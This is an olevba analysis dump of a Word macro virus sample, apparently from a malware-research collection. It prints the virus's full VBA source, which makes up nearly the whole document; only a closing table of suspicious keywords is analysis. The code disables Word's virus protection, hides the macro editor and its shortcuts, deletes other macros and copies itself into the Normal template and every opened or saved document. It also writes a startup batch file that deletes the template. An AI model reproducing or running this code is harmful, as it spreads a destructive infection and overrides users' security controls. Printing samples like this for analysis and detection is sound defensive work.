olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-a8d41ad710e295e4afc521c3be17c2b0123fc14a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-a8d41ad710e295e4afc521c3be17c2b0123fc14a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Armageddon.bas 
in file: Virus.MSWord.CyberHack-based-a8d41ad710e295e4afc521c3be17c2b0123fc14a - OLE stream: 'Macros/VBA/Armageddon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Macros by Ringo T Rivera

Public Armageddon0
Public Armageddon1
Public Armageddon2
Public Armageddon3

Sub Armageddon4()
 Call Armageddon9
 Armageddon0 = Application.DisplayAlerts
 Application.DisplayAlerts = wdAlertsNone
 WordBasic.DisableAutoMacros 0
 CommandBars("Visual Basic").Visible = False
 CommandBars("Visual Basic").Enabled = False
 CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
 CommandBars("Visual Basic").Protection = msoBarNoCustomize
 On Error Resume Next
 CommandBars("Tools").Controls("Macro").Delete
 CustomizationContext = NormalTemplate
 FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
 FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
 On Error GoTo 0
End Sub

Sub Armageddon5()
 Application.DisplayAlerts = Armageddon0
End Sub

Sub Armageddon6()
 Call Armageddon9
 On Error GoTo Jump0
 Armageddon2 = False
 Set ad = ActiveDocument
 Set nt = NormalTemplate
 On Error GoTo Jump1
 For i = 1 To nt.VBProject.VBComponents.Count
  NMacr = nt.VBProject.VBComponents(i).Name
  If NMacr = "Armageddon" Then Armageddon2 = True
  If (NMacr <> "Armageddon") And (NMacr <> "ArmageddonForm") And (NMacr <> "ThisDocument") Then
   Application.OrganizerDelete Source:=nt.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
  End If
 Next i
Jump1:
 If Armageddon2 = False Then
  On Error GoTo Jump3
  Application.OrganizerCopy Source:=ad.FullName, Destination:=nt.FullName, Name:="Armageddon", Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=ad.FullName, Destination:=nt.FullName, Name:="ArmageddonForm", Object:=wdOrganizerObjectProjectItems
  nfat = GetAttr(NormalTemplate.FullName)
  If (nfat <> vbReadOnly) And (nfat <> vbReadOnly + vbArchive) Then
   Templates(nt.FullName).Save
  Else
   Call ArmageddonB
  End If
Jump3:
 End If
Jump0:
End Sub

Sub Armageddon7()
 On Error GoTo Jump00
 Armageddon1 = 0
 Armageddon3 = False
 Set ad = ActiveDocument
 Set nt = NormalTemplate
 On Error GoTo Jump01
 For i = 1 To ad.VBProject.VBComponents.Count
  NMacr = ad.VBProject.VBComponents(i).Name
  If NMacr = "Armageddon" Then Armageddon3 = True
  If NMacr = "ArmageddonForm" Then Armageddon3 = True
  If (NMacr <> "Armageddon") And (NMacr <> "ArmageddonForm") And (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
   Application.OrganizerDelete Source:=ad.FullName, Name:=NMacr, Object:=wdOrganizerObjectProjectItems
  End If
 Next i
Jump01:
 If Armageddon3 = False Then
  On Error GoTo Jump03
  Application.OrganizerCopy Source:=nt.FullName, Destination:=ad.FullName, Name:="Armageddon", Object:=wdOrganizerObjectProjectItems
  Application.OrganizerCopy Source:=nt.FullName, Destination:=ad.FullName, Name:="ArmageddonForm", Object:=wdOrganizerObjectProjectItems
  Armageddon1 = 1
Jump03:
 End If
Jump00:
End Sub

Sub Armageddon8()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon5
End Sub

Sub Armageddon9()
 Options.VirusProtection = False
 Options.SaveNormalPrompt = False
End Sub

Sub ArmageddonA()
 On Error GoTo Jump21
 Set ad = ActiveDocument
 If Armageddon1 = 1 Then
  ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
 End If
Jump21:
End Sub

Sub ArmageddonB()
 Dim hFile As Long
 On Error Resume Next
 Set nt = NormalTemplate
 Part1 = "@echo off"
 Part11 = "attrib -s -h -r +a "
 snag = "c:\progra~1\micros~1\templa~1\"
 snag1 = "c:\progra~1\micros~2\templa~1\"
 Part2 = "del "
 Part33 = "cls"
 hFile = FreeFile
 ArmageddonFile = "c:\windows\startm~1\programs\startup\win.bat"
 Open ArmageddonFile For Output Access Write As hFile
  Print #hFile, Part1
  Print #hFile, Part11 + snag + nt
  Print #hFile, Part11 + snag1 + nt
  Print #hFile, Part2 + snag + nt
  Print #hFile, Part2 + snag1 + nt
  Print #hFile, Part33
  Print #hFile, Part2 + ArmageddonFile
 Close hFile
End Sub

Sub AutoOpen()
 Call Armageddon8
End Sub

Sub FileClose()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 WordBasic.FileClose
End Sub

Sub FileOpen()
 Call Armageddon8
 Dialogs(wdDialogFileOpen).Show
 Call Armageddon4
 Call Armageddon7
 Call ArmageddonA
 Call Armageddon5
End Sub

Sub FileSaveAs()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub FileSave()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 On Error GoTo Jump31
 If ActiveDocument.Saved = False Then ActiveDocument.Save
Jump31:
End Sub

Sub FileExit()
 Call Armageddon4
 Call Armageddon6
 Call Armageddon7
 Call Armageddon5
 WordBasic.FileExit
End Sub

Sub HelpAbout()
 On Error GoTo Jump11
 ArmageddonForm.Show
Jump11:
End Sub

Sub ToolsOptions()
 Dialogs(wdDialogToolsOptions).Show
 Call Armageddon8
End Sub

Sub FileNew()
 Call Armageddon8
 Dialogs(wdDialogFileNew).Show
End Sub

Sub FileTemplates()
 Call Armageddon8
End Sub

Sub ToolsMacro()
 Call Armageddon8
End Sub

Sub ToolsCustomize()
 Call Armageddon8
End Sub

Sub ToolsCustomizeKeyboard()
 Call Armageddon8
End Sub

Sub ViewVBCode()
 Call Armageddon8
End Sub

Sub Organizer()
End Sub
 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |win.bat             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

